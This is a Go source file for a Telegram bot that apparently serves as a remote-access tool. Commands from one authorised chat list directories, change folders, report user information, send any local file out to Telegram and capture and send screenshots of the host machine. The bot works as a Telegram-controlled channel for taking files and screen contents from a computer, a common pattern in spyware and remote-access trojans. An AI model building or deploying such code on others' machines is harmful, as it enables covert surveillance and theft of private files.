package bot

import (
	"github.com/vova616/screenshot"
	"image/png"
	"os"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

func Bot(token string, chatId int64) error {
	bot, err := tgbotapi.NewBotAPI(token)
	defer bot.StopReceivingUpdates()

	if err != nil {
		return err
	}

	bot.Debug = false

	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 60

	updates := bot.GetUpdatesChan(updateConfig)
	defer updates.Clear()
	for update := range updates {
		if update.Message == nil {
			continue
		}

		if update.Message.Chat.ID != chatId {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "you don't have access")

			_, err := bot.Send(msg)
			if err != nil {
				return err
			}
			continue
		}

		if !update.Message.IsCommand() {
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Wrong message. \n Please send command /help")

			_, err := bot.Send(msg)
			if err != nil {
				return err
			}

			continue

		} else {

			switch update.Message.Command() {
			case "help":

				commands := "Commands \n\n /info - user information. " +
					"\n /pwd - current directory. \n /cd <folder> - change folder." +
					"\n /ls - display the contents of directories. \n /download <filePath> - download file \n /screen - take screenshot"

				msg := tgbotapi.NewMessage(update.Message.Chat.ID, commands)

				_, err := bot.Send(msg)
				if err != nil {
					return err
				}
			case "info":
				text, err := info()
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = text
				}

				_, err = bot.Send(msg)
				if err != nil {
					return err
				}
			case "pwd":
				text, err := pwd()
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = text
				}

				_, err = bot.Send(msg)
				if err != nil {
					return err
				}
			case "cd":
				text, err := cd(update.Message.Text)
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = text
				}

				_, err = bot.Send(msg)
				if err != nil {
					return err
				}
			case "ls":
				text, err := ls()
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")

				if err != nil {
					msg.Text = err.Error()
				} else {
					msg.Text = text
				}

				_, err = bot.Send(msg)
				if err != nil {
					return err
				}
			case "download":
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")

				dir := strings.Split(update.Message.Text, " ")

				if len(dir) != 2 {
					msg.Text = "wrong format"
					_, err = bot.Send(msg)
					if err != nil {
						return err
					}

				} else {
					file := tgbotapi.NewInputMediaDocument(tgbotapi.FilePath(dir[1]))
					_, err := bot.Send(tgbotapi.NewDocument(update.Message.Chat.ID, file.Media))
					if err != nil {
						msg.Text = err.Error()
						_, err = bot.Send(msg)
						if err != nil {
							return err
						}
						continue
					}

				}
			case "screen":
				img, err := screenshot.CaptureScreen()
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "")
				if err != nil {
					msg.Text = err.Error()
					_, err := bot.Send(msg)
					if err != nil {
						return err
					}
					continue
				}

				f, err := os.OpenFile("./s.png", os.O_CREATE, 0777)
				if err != nil {
					msg.Text = err.Error()
					_, err := bot.Send(msg)
					if err != nil {
						return err
					}
					continue
				}

				err = png.Encode(f, img)
				if err != nil {
					msg.Text = err.Error()
					_, err := bot.Send(msg)
					if err != nil {
						return err
					}
				}
				err = f.Close()
				if err != nil {
					msg.Text = err.Error()
					_, err := bot.Send(msg)
					if err != nil {
						return err
					}
				}

				file := tgbotapi.NewInputMediaPhoto(tgbotapi.FilePath(f.Name()))
				_, _ = bot.Send(tgbotapi.NewPhoto(update.Message.Chat.ID, file.Media))
				_ = os.Remove(f.Name())

			default:
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Invalid command entered. \n Please send command /help")

				_, err := bot.Send(msg)
				if err != nil {
					return err
				}
			}

		}

	}

	return nil
}
